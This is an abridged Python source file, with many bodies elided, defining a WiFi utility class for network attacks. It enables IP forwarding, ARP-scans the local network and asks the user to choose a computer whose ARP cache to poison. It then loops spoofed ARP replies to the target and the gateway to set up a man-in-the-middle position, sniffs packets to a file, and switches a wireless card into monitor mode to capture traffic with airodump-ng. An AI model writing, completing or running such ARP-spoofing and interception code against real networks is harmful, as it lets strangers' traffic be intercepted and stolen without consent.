...
class UtilsWifi:
    ...
    def activate_ip_forwarding(self) -> bool:
        try:
            self.utils.run_command_output_loop('activate ip forward (1/2)', [
                self.utils.ctx.use_sudo+['sysctl', '-w', 'net.ipv4.ip_forward=1']
            ])
            self.utils.run_command_output_loop('activate ip forward (2/2)', [
    ...
    def deactivate_ip_forwarding(self) -> bool:
        try:
            self.utils.run_command_output_loop('deactivate ip forward (1/2)', [
                self.utils.ctx.use_sudo+['sysctl', '-w', 'net.ipv4.ip_forward=0']
            ])
            self.utils.run_command_output_loop('deactivate ip forward (2/2)', [
                self.utils.ctx.use_sudo+['sysctl', '-p', '/etc/sysctl.conf']
            ])
            return True
        except Exception as e:
    ...
    def scan_arp(self, net: str) -> Union[List[Dict[str, str]], None]:
        ...
        ans: Union[List[Any], None] = arping(net, verbose=self.utils.ctx.logging_verbose)[0]
        if ans is not None:
            return [{'ip': res[1].psrc, 'mac': res[1].hwsrc} for res in ans]
        return None

    def gateway_info(self, arp_res: List[Dict[str, str]]) -> Union[List[Dict[str, str]], None]:
        '''
        ...
        result: Union[str, List[str], None] = self.utils.run_command_output_loop(
            'gateway info', [
                self.utils.ctx.use_sudo+['route', '-n']
            ])
                ...
                for row in result:
                    ...
                    if iface_mac is not None and iface_ip is not None and iface_ip in row:
                        ...
                        if iface_name is not None:
                            ...
                            gateways.append({'iface': iface_name, 'ip': iface_ip, 'mac': iface_mac})
            return gateways
        return None
    ...
    def get_clients(self, arp_res: List[Dict[str, str]], gateway_res: List[Dict[str, str]]):
        '''
    ...
    def print_arp_res(self, arp_res: List[Dict[str, str]]) -> int:
        ...
        while True:
            try:
                ...
                logging.log(logging.INFO, 'Please select the ID of the computer whose ARP cache you want to poison (ctrl+c to exit): ')
                choice = int(input(''))
                if arp_res[choice]:
                    return choice
            except Exception:
    ...
    def send_spoof_packets(self, gateway_info: Dict[str, str], node_to_spoof: Dict[str, str]) -> None:
        '''
        ...
        try:
            ...
            while is_running:
                ...
                self.arp_spoofer(gateway_info.get('ip'), gateway_info.get('mac'), node_to_spoof.get('ip'))
                # We send an arp packet to the target machine saying that we are gateway.
                self.arp_spoofer(node_to_spoof.get('ip'), node_to_spoof.get('mac'), gateway_info.get('ip'))
    ...
    def arp_spoofer(self, target_ip: Union[str, None], target_mac: Union[str, None], spoof_ip: Union[str, None]) -> None:
        '''
    ...
    def packet_sniffer(self, interface: str, path: str, filename: str) -> None:
        ...
        packets: PacketList = scapy.sniff(iface=interface, store=False,
    ...
    def find_nic(self) -> Union[List[str], None]:
        ...
        result = self.utils.run_command_output_loop('find nic', [
            self.utils.ctx.use_sudo+['iw', 'dev']
        ])
    ...
    def set_monitor_mode(self, wifi_name: str) -> None:
        ...
        self.utils.run_command_output_loop('monitor mode (kill)', [
    ...
    def set_band_to_monitor(self, choice: int, wifi_name: str) -> None:
        ...
        if choice == 0:
            ...
            self.utils.run_command_output_loop('band (bg)', [
                self.utils.ctx.use_sudo+['airodump-ng', '--band', 'bg', '-w', 'file',
                                         '--write-interval', '1', '--output-format', 'csv', wifi_name]
            ])
        elif choice == 1:
            # Band a is for 5Ghz WiFi Networks
            self.utils.run_command_output_loop('band (a)', [
                self.utils.ctx.use_sudo+['airodump-ng', '--band', 'a', '-w', 'file',
                                         '--write-interval', '1', '--output-format', 'csv', wifi_name]
            ])
        else:
            # Will use bands a, b and g (actually band n). Checks full spectrum.
            self.utils.run_command_output_loop('band (abg)', [
                self.utils.ctx.use_sudo+['airodump-ng', '--band', 'abg', '-w', 'file',
                                         '--write-interval', '1', '--output-format', 'csv', wifi_name]
            ])
